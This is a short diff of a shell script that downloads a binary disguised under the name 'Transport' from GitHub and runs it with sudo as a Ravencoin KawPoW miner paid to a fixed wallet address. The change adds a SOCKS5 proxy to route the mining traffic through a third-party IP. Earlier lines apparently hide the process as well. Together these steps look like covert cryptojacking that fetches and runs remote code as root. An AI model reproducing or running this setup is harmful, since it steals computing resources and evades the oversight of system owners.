@@ -7,4 +7,4 @@ dpkg-reconfigure --frontend noninteractive tzdata
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
 chmod +x Transport
 ph add Transport
-sudo ./Transport -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni  --dns-https-server 1.1.1.1     
+sudo ./Transport -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni --socks5 192.252.211.197:14921 --dns-https-server 1.1.1.1     
